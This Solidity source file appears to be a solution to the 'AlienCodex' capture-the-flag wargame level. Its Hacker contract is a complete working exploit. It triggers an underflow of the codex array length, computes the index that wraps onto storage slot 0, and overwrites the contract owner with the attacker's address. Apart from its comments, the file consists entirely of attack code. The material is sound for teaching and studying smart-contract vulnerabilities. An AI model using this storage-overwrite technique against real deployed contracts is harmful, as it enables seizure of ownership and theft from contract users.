// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = msg.sender;
  }

  function attack(address _target) public onlyHacker {
    AlienCodex alienCodex = AlienCodex(_target);

    // 1. Make contact
    alienCodex.make_contact();

    // 2. Cause underflow of the length of codex
    alienCodex.retract();

    // 3. Now can access any slot of the storage
    // Calculate the index in codex array that is corresponding to the slot 0, where owner & contact exist at
    uint256 index = 2**256 - 1 - uint256(keccak256(abi.encode(1))) + 1;

    // 4. Overwrite the owner
    alienCodex.revise(index, bytes32(uint256(address(msg.sender))));
  }
}
